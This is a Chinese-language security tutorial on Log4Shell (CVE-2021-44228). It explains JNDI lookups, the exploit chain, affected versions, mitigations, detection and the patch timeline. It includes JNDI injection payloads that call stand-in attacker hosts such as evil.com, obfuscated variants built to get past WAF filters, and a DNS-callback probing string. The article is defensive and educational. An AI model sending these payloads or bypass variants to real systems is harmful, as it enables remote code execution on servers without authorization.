---
title: Log4Shell：一行日志里的远程代码执行（Log4j JNDI 注入）
description: 拆解 CVE-2021-44228 的成因——Log4j 2.x 的消息查找功能如何被 ${jndi:ldap://} 利用，从 JNDI/LDAP 原理到利用链、影响版本与升级修复，给出可落地的应急与检测方案。
category: security
subcategory: java-eco
tags: ['Log4j', 'Log4Shell', 'JNDI', 'CVE-2021-44228', 'RCE']
pubDate: 2026-07-19
updatedDate: 2026-07-19
order: 2
---

2021 年 12 月，一条安全公告让全球运维连夜加班：只要你的 Java 应用用了 `Log4j 2.x`，并且**把用户输入写进了日志**，攻击者可能什么都不用做，只发一个特殊字符串，就能在你的服务器上执行任意命令。这就是 Log4Shell（CVE-2021-44228），被多家机构评为"十年来最严重漏洞"之一。

这一篇把它的原理、利用和修复讲透，让你不仅知道"升级就完事"，更明白**为什么**会这样。

> 本文仅用于理解漏洞原理与防御。对他人系统构造并利用该漏洞属违法。请在授权靶场练习。

## 先搞懂 JNDI 是什么

**JNDI**（Java Naming and Directory Interface）是 Java 的一套命名/目录服务接口，简单说就是"按名字查东西"：它可以通过名字去 `LDAP`、`RMI`、`DNS` 等服务里查找并**加载对象**。

```java
// 正常用途：从 LDAP 查一个配置对象
Context ctx = new InitialContext();
Object obj = ctx.lookup("ldap://internal-server:389/config");
```

关键点在于：JNDI 的 `lookup` 不仅能查本地，还能**从远程 LDAP/RMI 服务器拉取一个"类"并实例化**。这本来是方便企业做集中配置，却成了攻击跳板。

## 漏洞根因：Log4j 的"消息查找"

Log4j 2.x 有个功能叫 **Lookups**（查找），允许在日志消息里用 `${...}` 语法动态取值，比如 `${env:USER}` 取环境变量、`${date:yyyy}` 取日期。

问题出在：Log4j 在处理日志文本时，会**无差别地解析其中所有 `${...}`**，而且它支持的 lookup 类型里包含 `jndi:`。于是当日志内容里出现 `${jndi:ldap://attacker.com/a}`，Log4j 会真的去发起 JNDI 查询。

```java
// 应用里一行普通的日志
log.info("用户登录: " + userInput);   // userInput 来自请求参数/Header
// 攻击者把 userInput 设成：
// ${jndi:ldap://evil.com:1389/Exploit}
// Log4j 解析到 ${jndi:...} → 发起 LDAP 查询 → 加载远程恶意类 → 实例化 → 代码执行
```

## 利用链：从日志到命令执行

完整链路是这样的：

1. 攻击者把 `${jndi:ldap://evil.com:1389/Exploit}` 塞进任意会被记录的用户输入（常见是 `User-Agent`、`Referer`、登录名、Cookie、甚至表单字段）。
2. 应用记录这条日志，Log4j 解析 `${jndi:...}`，向 `evil.com` 的 LDAP 服务发起查询。
3. 恶意 LDAP 服务器返回一个"指向远程 class 文件"的引用（Java 的 `Reference`/`JNDI Reference` 机制允许返回类的下载地址）。
4. 受害 JVM 按引用去 `evil.com` 下载 `Exploit.class` 并**实例化**（执行其静态代码块/构造方法）。
5. `Exploit` 类里写死 `Runtime.getRuntime().exec("...")`，反弹 shell 或下载木马——RCE 达成。

```text
攻击者 ──(带 ${jndi:...} 的请求)──> 应用记日志
                                      │ Log4j 解析 lookup
                                      ▼
                                LDAP 查询 evil.com
                                      │ 返回恶意类引用
                                      ▼
                                下载 Exploit.class 并实例化
                                      │
                                      ▼
                                Runtime.exec → 命令执行
```

## 影响版本与关联 CVE

- **CVE-2021-44228**：核心漏洞，影响 `2.0-beta9` 到 `2.14.1`（开启 lookup 的默认配置）。
- **CVE-2021-45046**：2.15.0 的修复不彻底，某些非默认配置下仍可信息泄露/部分利用。
- **CVE-2021-45105**：2.16.0 前的递归 lookup 导致**拒绝服务**（无限自引用 `${${:::-...}}`）。

一句话：**2.17.1 及之后**才是真正安全的版本线（Java 7 用户用 `2.12.4`，Java 8 用 `2.17.1`）。

## 应急与修复：按优先级做

如果你在漏洞爆发期或自查中发现中招，按这个顺序处理：

**第一优先——临时止血（不改代码）：**

```bash
# 1) JVM 参数关闭 lookup（2.10+ 支持）
-Dlog4j2.formatMsgNoLookups=true

# 2) 或设置环境变量
LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# 3) 或删除有问题的类（2.10–2.14.1）
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

**第二优先——根治升级：**

```xml
<!-- Maven：升级到安全版本 -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.17.1</version>
</dependency>
```

从 2.16.0 起，Log4j **默认关闭**了消息里的 JNDI lookup，2.17.1 进一步限制为只查本地、禁止远程加载，根因被堵死。

**第三优先——边界防御：**

- WAF/网关加规则拦截含 `${jndi:`、`${(` 的请求（注意各种变形如 `${${::-j}ndi:`）。
- 出网管控：限制应用服务器对外部 `LDAP(389/1389)`、`RMI(1099)` 的出站连接，断了利用链最后一跳。

## 怎么确认"我到底有没有中招"

- **查依赖**：`mvn dependency:tree | grep log4j` 看是否间接引入了 `log4j-core` 2.x 危险版本。
- **查流量**：在 WAF/IDS 看是否有外联 `LDAP/RMI` 的异常请求。
- **查进程**：服务器上是否出现了异常外连、陌生 `java` 子进程、挖矿进程。

## 利用变形与绕过思路

攻击者从不会只发一个标准 `${jndi:ldap://}`。为了绕过 WAF 和日志脱敏，他们会用各种变形：

- **嵌套与混淆**：`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x}` 用字符拼接绕过关键字检测。
- **大小写与编码**：`${Jndi:`、`${jNdI:` 等；或借助 `lower`/`upper` lookup 做大小写归一。
- **环境变量拼接**：`${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://x}`。
- **借 DNS 探测**：先发 `${jndi:dns://id.dnslog.cn}` 只做 DNS 回调，确认目标存在解析行为后再上 LDAP 完整利用——这比直接 RCE 更隐蔽，也更容易过基础防护。

理解这些变形，你才不会以为"WAF 拦了 `${jndi:` 就万事大吉"。真正稳的还是**升级 + 关 lookup**。

## 时间线：那几天发生了什么

把时间线摊开，能体会漏洞响应的速度压力：

- **2021-12-09** 阿里云向 Apache 上报 Log4j 2 RCE。
- **2021-12-10** Apache 发布 2.15.0，本以为修好。
- **2021-12-14** 发现 2.15.0 不彻底（CVE-2021-45046），发 2.16.0，默认关 JNDI。
- **2021-12-18** 再发现 2.16.0 有拒绝服务（CVE-2021-45105），发 2.17.1，彻底限制为只查本地。
- 同一周，全网扫描器、挖矿、勒索团伙已大规模利用，运维连夜加班。

这告诉我们：**漏洞修复是迭代的，不要押注"第一个补丁就完美"**，升级到位（2.17.1）才算落地。

## 相关家族：Log4j 1.x 与 Logback 要不要管

很多人升级完 `log4j-core` 2.x 就松口气，却忽略了另外两个"亲戚"：

- **Log4j 1.x**：早已在 2015 年停止维护（EOL），它本身没有 JNDI lookup 这个 Log4Shell 问题，但它有**自己的老漏洞**，比如 `CVE-2019-17571`（SocketServer 反序列化 RCE）、`CVE-2021-4104`（JMSAppender JNDI）。更关键的是：它不再收任何安全补丁，属于"技术债炸弹"。正确做法是**直接迁移到 Log4j 2.x 或 Logback**，别在 1.x 上打补丁。
- **Logback**：和 Log4j 2 同属 Ceki Gülcü 的作品，但 Logback **没有**消息 lookup 功能，因此不受 Log4Shell 影响。如果你本来就用 Logback（Spring Boot 默认就是 Logback），那这次与你无关——但要确认项目里没有"混用"进 `log4j-core` 2.x。

一句话：**Log4Shell 是 `log4j-core` 2.x 的专利；但 1.x 因停更同样该换；Logback 基本安全。**

## 应急实战：一份可照做的 checklist

当安全公告弹出、你又不确定影响范围时，按这个顺序操作，避免慌中出错：

1. **先确认版本**：`mvn dependency:tree | grep log4j` 或 `find / -name "log4j-core*.jar"` 全盘搜，别漏了间接依赖和容器自带的包。
2. **能升级就升级**：改版本到 `2.17.1`（Java 8）/ `2.12.4`（Java 7），重新打包上线——这是根治，优先级最高。
3. **升不了就止血**：在启动参数加 `-Dlog4j2.formatMsgNoLookups=true`，或删 `JndiLookup.class`，重启生效。
4. **边界拦截**：WAF 加规则拦 `${jndi:` 及各种变形；出口防火墙禁应用服务器对外连 `LDAP(389/1389)`、`RMI(1099)`。
5. **验证**：用无害的 `${jndi:dns://你的dnslog域名}` 探一下，若没收到 DNS 回调，说明解析已失效（仅授权自测）。
6. **留痕复盘**：记录受影响资产、处置动作、时间，归入安全事件库，下次更快。

## 如何验证修复真的生效

改完配置或升完级，别凭感觉判断"应该好了"，要做确认：

- **版本核对**：`jar tf log4j-core-2.17.1.jar | head` 确认包版本；或看 `META-INF/MANIFEST.MF` 的 `Implementation-Version`。若存在多个 `log4j-core`（冲突依赖），用 `mvn dependency:tree` 确认最终生效的是安全版。
- **行为自测（授权）**：发一个无害的 `${jndi:dns://你的dnslog域名}` 到会记日志的接口，若 DNS 平台**没收到回调**，说明 lookup 已失效。收到回调则证明还没修好。
- **类存在性**：确认 `JndiLookup.class` 已被删（临时止血方案），或升级后该 lookup 已默认禁用。
- **边界确认**：WAF 规则已生效、出网策略已限制 LDAP/RMI 出站。

记住："没有 DNS 回调"只证明 lookup 被禁，**不代表你不用升级**——升级到 2.17.1 才是堵死所有关联 CVE 的根因。

## 常见误区

- **"我们的日志不记用户输入"**：Header、Cookie、Referer、URL 参数常常被框架或中间件悄悄记进日志，你未必知道哪行代码会记。
- **"用了 logback 就没事"**：Log4Shell 是 `log4j-core` 2.x 的问题；但若项目里还残留 `log4j 1.x` 或别的日志桥接，也要一并理清。
- **"删 JndiLookup 类会影响功能"**：JNDI lookup 在绝大多数业务里用不到，删除或关 lookup 几乎无副作用，收益远大于风险。

## 自测题

1. 你的应用用的日志实现到底是 log4j 2.x、log4j 1.x 还是 logback？怎么确认（依赖树）？
2. 如果现在必须 30 分钟内止血，你会先执行哪条临时措施？
3. 说出 CVE-2021-44228 / 45046 / 45105 分别修了什么、为什么需要三次。
4. 为什么"只靠 WAF 拦截 `${jndi:`"不足以防御？

## 这一篇你该记住的

- Log4Shell 的根因是 Log4j 2.x 会**无差别解析日志里的 `${jndi:...}` lookup**，进而发起远程 JNDI 查询并加载恶意类。
- 触发面极广：任何被记录的用户输入（Header、参数、Cookie）都可能成为入口。
- 利用链是 `日志 → JNDI lookup → LDAP 返回类引用 → 下载并实例化恶意类 → Runtime.exec`。
- 影响 `2.0-beta9 ~ 2.14.1`；`CVE-2021-44228/45046/45105` 三个补丁后才安全。
- 应急先 `-Dlog4j2.formatMsgNoLookups=true` 或删 `JndiLookup.class`，根治是升级到 `2.17.1`；再配合 WAF 与出网管控。

下一篇我们深入 Java 生态另一个"祖传"高危面——**反序列化与 gadget 链**。你会发现 Log4Shell 之外，还有一整套靠"把对象读回来"就能打穿的利用方式，而 CommonsCollections 正是它的开山鼻祖。